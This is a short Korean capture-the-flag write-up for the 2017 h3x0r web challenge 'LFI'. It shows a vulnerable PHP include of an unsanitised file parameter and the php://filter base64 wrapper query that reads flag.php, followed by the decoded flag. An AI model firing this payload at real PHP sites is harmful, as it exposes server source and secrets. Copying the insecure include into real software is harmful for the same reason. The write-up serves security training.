# 2017 h3x0r - [WEB] LFI

## Key words

- Local File Inclusion (LFI)
- PHP Wrapper

## Solution

문제에 접속하면 `Shell Command`를 입력하라고 뜨지만 실제로는 `Command Injection`이 되는것은 아니고 `ls`만 가능하며 나타나는 목록은 다음과 같습니다.

- flag.php
- aoba.php
- sagiri.php

그리고 사용자에게 파일명을 입력 받을 수 있는 `Input box`가 하나 생성됩니다.

```html
<form action='./chall.php' method='get'>
  input file name : <input type='text' name='file'>
</form>
```

`chall.php`에 `$_GET['file']`로 파일명을 넘겨 주는 것 같습니다.

하지만 실제로는 잘 동작하지 않고, 조금 테스트를 하다가 내린 결론은 다음과 같습니다.

- 문제명이 `LFI`
- `aoba.php`를 넣었을 경우 `base64`에 대해 아는지 물어 보는 텍스트

결론적으로 `php wrapper`를 이용한 문제 입니다.

`LFI`가 발생되는 기본저인 PHP 코드는 다음과 같습니다.

```php
<?php
$file_name = $_GET['file'];
include("pages/$file_name");
?>
```

따라서 `$_GET['file']`에 PHP 래퍼를 넣어 `flag.php`를 읽는 쿼리는 같습니다.

> chall.php?file=php://filter/convert.base64-encode/resource=flag.php

다음과 같이 쿼리를 전송하게 되면 페이지에 flag.php에 대한 내용이 `base64` 형태로 뜨게 되고 이를 디코딩 하게 되면 정답이 나오게 됩니다.

> PD9waHAKICAgIGVjaG8gIlVzZSBMRkkhIjsKICAgICRmbGFnID0gIkgzWDBSe2EwYmFfYzB0ZV9hZG0xdD99IjsK

```
<?php
    echo "Use LFI!";
    $flag = "H3X0R{a0ba_c0te_adm1t?}";
```
